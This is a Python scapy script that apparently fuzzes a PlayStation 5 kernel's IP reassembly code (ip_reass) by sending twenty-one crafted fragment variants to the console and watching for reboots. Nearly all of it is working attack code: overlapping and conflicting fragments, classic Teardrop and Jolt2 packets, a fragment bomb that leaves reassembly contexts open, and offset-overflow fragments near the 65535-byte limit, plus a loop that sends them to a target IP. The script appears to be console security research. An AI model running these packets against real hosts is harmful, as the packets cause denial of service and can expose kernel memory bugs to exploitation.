#!/usr/bin/env python3
"""Send crafted IP fragments to PS5 targeting ip_reass() in the kernel.

ip_reass() is one of the most historically vulnerable kernel code paths
(FragmentSmack CVE-2018-5391, Teardrop, Rose Attack, etc.). These fragments
arrive at ip_input() → ip_reass() BEFORE any socket processing, meaning
they execute in full kernel context with no sandbox filtering.

The PS5 listener (46c_ip_options_listener.lua on UDP 31338) receives the
reassembled packets — if a variant crashes ip_reass(), the console reboots
and the last logged variant is the suspect.

Usage:
    pip install scapy
    sudo python ip_fragment_inject.py --ps5-ip 10.0.0.96

Each variant is sent with a configurable delay. Monitor the PS5 for
reboots — a crash during reassembly means we found a kernel bug.
"""

import argparse
import struct
import sys
import time

try:
    from scapy.all import (IP, UDP, Raw, send, conf, fragment,
                           RandShort, RandInt)
except ImportError:
    print("[!] scapy not installed: pip install scapy")
    sys.exit(1)

LOG = []


def log(msg):
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    LOG.append(line)


def build_fragment_variants(ps5_ip, src_ip):
    """Return (name, [fragment_packets]) pairs."""
    dst = ps5_ip
    dport = 31338
    sport = 12345
    # IP identification field — unique per test
    base_id = 0x4100
    variants = []

    # Helper: build a raw IP fragment
    def frag(ipid, offset, mf, payload, flags_extra=0):
        """Build one IP fragment.
        offset: in 8-byte units (fragment offset field)
        mf: 1 = More Fragments, 0 = last fragment
        """
        frag_off = offset | (mf << 13) | (flags_extra << 14)
        return IP(src=src_ip, dst=dst, id=ipid, frag=offset,
                  flags=("MF" if mf else 0), proto=17) / Raw(payload)

    # --- 0. Baseline: normal fragmented UDP ---
    # Build a 2000-byte UDP payload, let scapy fragment it
    baseline_pkt = IP(src=src_ip, dst=dst, id=base_id) / \
                   UDP(sport=sport, dport=dport) / Raw(b"\xAA" * 2000)
    baseline_frags = fragment(baseline_pkt, fragsize=512)
    variants.append(("baseline_fragmented", baseline_frags))

    # --- 1. Overlapping fragments ---
    # Fragment 1: offset 0, 64 bytes (contains UDP header)
    # Fragment 2: offset 4 (32 bytes into frag1), 64 bytes — OVERLAPS
    # Fragment 3: offset 16 (128 bytes), last fragment
    ipid = base_id + 1
    udp_hdr = struct.pack("!HHHH", sport, dport, 200, 0)  # UDP header
    variants.append(("overlap_basic", [
        frag(ipid, 0, 1, udp_hdr + b"\x01" * 56),          # 0-63
        frag(ipid, 4, 1, b"\x02" * 64),                     # 32-95 (overlaps)
        frag(ipid, 16, 0, b"\x03" * 64),                    # 128-191 (last)
    ]))

    # --- 2. Overlapping with conflicting data ---
    ipid = base_id + 2
    variants.append(("overlap_conflict", [
        frag(ipid, 0, 1, udp_hdr + b"\xAA" * 120),         # 0-127
        frag(ipid, 8, 1, b"\xBB" * 64),                     # 64-127 (conflict!)
        frag(ipid, 16, 0, b"\xCC" * 64),                    # 128-191 (last)
    ]))

    # --- 3. Teardrop: fragment 2 has offset < frag1_end but total < frag1_end ---
    # Classic teardrop: second fragment offset + length < first fragment end
    ipid = base_id + 3
    variants.append(("teardrop_classic", [
        frag(ipid, 0, 1, udp_hdr + b"\xDD" * 120),         # 0-127
        frag(ipid, 1, 0, b"\xEE" * 8),                      # 8-15 (INSIDE frag1)
    ]))

    # --- 4. Tiny fragments (8 bytes each) ---
    # Split a 64-byte UDP packet into 8-byte chunks
    ipid = base_id + 4
    full_payload = udp_hdr + b"\x44" * 56
    tiny_frags = []
    for i in range(0, len(full_payload), 8):
        chunk = full_payload[i:i+8]
        is_last = (i + 8 >= len(full_payload))
        tiny_frags.append(frag(ipid, i // 8, 0 if is_last else 1, chunk))
    variants.append(("tiny_8byte_frags", tiny_frags))

    # --- 5. Out-of-order fragments ---
    ipid = base_id + 5
    payload = udp_hdr + b"\x55" * 184
    frags_ooo = [
        frag(ipid, 16, 0, payload[128:192]),   # last first
        frag(ipid, 8, 1, payload[64:128]),      # middle
        frag(ipid, 0, 1, payload[0:64]),         # first last
    ]
    variants.append(("out_of_order", frags_ooo))

    # --- 6. Duplicate fragments ---
    ipid = base_id + 6
    variants.append(("duplicate_frags", [
        frag(ipid, 0, 1, udp_hdr + b"\x66" * 56),
        frag(ipid, 0, 1, udp_hdr + b"\x67" * 56),  # DUPLICATE of offset 0
        frag(ipid, 8, 0, b"\x68" * 64),
    ]))

    # --- 7. Missing middle fragment (incomplete reassembly) ---
    ipid = base_id + 7
    variants.append(("missing_middle", [
        frag(ipid, 0, 1, udp_hdr + b"\x77" * 56),   # first
        # skip offset 8
        frag(ipid, 16, 0, b"\x78" * 64),              # last (gap at 64-127)
    ]))

    # --- 8. Zero-length last fragment ---
    ipid = base_id + 8
    variants.append(("zero_length_last", [
        frag(ipid, 0, 1, udp_hdr + b"\x88" * 56),
        frag(ipid, 8, 0, b""),                         # empty last fragment
    ]))

    # --- 9. Huge offset (total > 65535) ---
    ipid = base_id + 9
    variants.append(("huge_offset", [
        frag(ipid, 0, 1, udp_hdr + b"\x99" * 56),
        frag(ipid, 8189, 0, b"\x9A" * 8),   # offset 65512 + 8 = 65520
    ]))

    # --- 10. Offset overflow (offset*8 + len > 65535) ---
    ipid = base_id + 10
    variants.append(("offset_overflow", [
        frag(ipid, 0, 1, udp_hdr + b"\xA0" * 56),
        frag(ipid, 8100, 0, b"\xA1" * 512),  # 64800 + 512 = 65312, close to limit
    ]))

    # --- 11. Multiple "last" fragments (conflicting completion) ---
    ipid = base_id + 11
    variants.append(("multi_last", [
        frag(ipid, 0, 1, udp_hdr + b"\xBB" * 56),
        frag(ipid, 8, 0, b"\xBC" * 64),               # last at offset 64
        frag(ipid, 16, 0, b"\xBD" * 64),              # ANOTHER last at offset 128
    ]))

    # --- 12. Fragment with MF=1 but beyond reported total ---
    ipid = base_id + 12
    variants.append(("mf_past_total", [
        frag(ipid, 0, 1, udp_hdr + b"\xCC" * 56),
        frag(ipid, 8, 0, b"\xCD" * 32),               # last at offset 64+32=96
        frag(ipid, 24, 1, b"\xCE" * 64),              # MF=1 at offset 192 (past last!)
    ]))

    # --- 13. Max fragments (65535 / 8 = 8191 fragments) ---
    # Don't actually send 8191, but send 256 tiny frags
    ipid = base_id + 13
    max_frags = []
    for i in range(256):
        is_last = (i == 255)
        if i == 0:
            max_frags.append(frag(ipid, 0, 1, udp_hdr + b"\xDD" * 56))
        else:
            max_frags.append(frag(ipid, i * 8, 0 if is_last else 1, b"\xDE" * 64))
    variants.append(("many_frags_256", max_frags))

    # --- 14. Fragment bomb: start 32 reassembly contexts, never complete ---
    bomb_frags = []
    for i in range(32):
        bomb_id = base_id + 100 + i
        bomb_frags.append(frag(bomb_id, 0, 1, udp_hdr + b"\xEE" * 56))
    variants.append(("fragment_bomb_32", bomb_frags))

    # --- 15. Jolt2: identical first fragments repeated ---
    ipid = base_id + 15
    jolt_frags = []
    for _ in range(64):
        jolt_frags.append(frag(ipid, 0, 1, udp_hdr + b"\xFF" * 56))
    variants.append(("jolt2_repeat_first", jolt_frags))

    # --- 16. Nested overlap: 3 fragments all covering same range ---
    ipid = base_id + 16
    variants.append(("triple_overlap", [
        frag(ipid, 0, 1, udp_hdr + b"\x11" * 120),     # 0-127
        frag(ipid, 0, 1, b"\x22" * 128),                 # 0-127 (same range!)
        frag(ipid, 0, 1, b"\x33" * 128),                 # 0-127 (triple!)
        frag(ipid, 16, 0, b"\x44" * 64),                 # 128-191 (last)
    ]))

    # --- 17. Reverse-order tiny frags with overlap ---
    ipid = base_id + 17
    rev_tiny = []
    for i in range(15, -1, -1):
        is_last = (i == 15)
        payload_byte = bytes([0x50 + (i % 16)])
        rev_tiny.append(frag(ipid, i, 0 if is_last else 1, payload_byte * 8))
    variants.append(("reverse_tiny_overlap", rev_tiny))

    # --- 18. Fragment with offset 0 and MF=0 (single fragment, should be normal) ---
    ipid = base_id + 18
    variants.append(("single_frag_mf0", [
        frag(ipid, 0, 0, udp_hdr + b"\x60" * 56),
    ]))

    # --- 19. Two complete reassemblies with same ID ---
    ipid = base_id + 19
    variants.append(("double_complete", [
        frag(ipid, 0, 1, udp_hdr + b"\x70" * 56),
        frag(ipid, 8, 0, b"\x71" * 64),
        # Second complete set with same ID
        frag(ipid, 0, 1, udp_hdr + b"\x72" * 56),
        frag(ipid, 8, 0, b"\x73" * 64),
    ]))

    # --- 20. Fragment right at 65535 boundary ---
    ipid = base_id + 20
    # Max IP packet = 65535. IP header = 20. So max fragment data = 65515.
    # Offset 8188 * 8 = 65504, + 31 bytes = 65535 exactly
    variants.append(("boundary_65535", [
        frag(ipid, 0, 1, udp_hdr + b"\x80" * 56),
        frag(ipid, 8188, 0, b"\x81" * 31),  # reaches exactly 65535
    ]))

    return variants


def main():
    ap = argparse.ArgumentParser(description="IP fragment injection to PS5")
    ap.add_argument("--ps5-ip", required=True, help="PS5 LAN IP")
    ap.add_argument("--src-ip", default=None,
                    help="source IP (default: auto-detect)")
    ap.add_argument("--delay", type=float, default=1.0,
                    help="seconds between variants (fragments within a variant are instant)")
    ap.add_argument("--variant", type=int, default=-1,
                    help="pin a single variant index (-1 = all)")
    ap.add_argument("--rounds", type=int, default=1,
                    help="number of rounds")
    ap.add_argument("--start", type=int, default=0,
                    help="start at variant index (skip earlier ones)")
    args = ap.parse_args()

    conf.verb = 0

    src_ip = args.src_ip
    if not src_ip:
        from scapy.all import get_if_addr, conf as sconf
        src_ip = get_if_addr(sconf.iface)
        if src_ip == "0.0.0.0":
            log("could not auto-detect source IP — use --src-ip")
            sys.exit(1)

    log(f"IP fragment injection v1")
    log(f"target: {args.ps5_ip}  src: {src_ip}")

    variants = build_fragment_variants(args.ps5_ip, src_ip)
    log(f"{len(variants)} variants prepared")

    if args.variant >= 0:
        variants = [variants[args.variant % len(variants)]]
        log(f"pinned to: {variants[0][0]}")
    elif args.start > 0:
        variants = variants[args.start:]
        log(f"starting from variant {args.start}")

    for rnd in range(args.rounds):
        for i, (name, frags) in enumerate(variants):
            log(f"round {rnd+1} [{i+1}/{len(variants)}]: {name} ({len(frags)} fragments)")
            try:
                for f in frags:
                    send(f)
            except Exception as e:
                log(f"  send error: {e}")
            time.sleep(args.delay)

    log("--- done ---")
    log("if console stopped responding, the last logged variant is the suspect")
    log("ping the PS5 to check if it's still alive")

    logfile = f"ip_fragment_inject_{time.strftime('%Y%m%d_%H%M%S')}.log"
    with open(logfile, "w") as f:
        f.write("\n".join(LOG) + "\n")
    log(f"log saved to {logfile}")


if __name__ == "__main__":
    main()
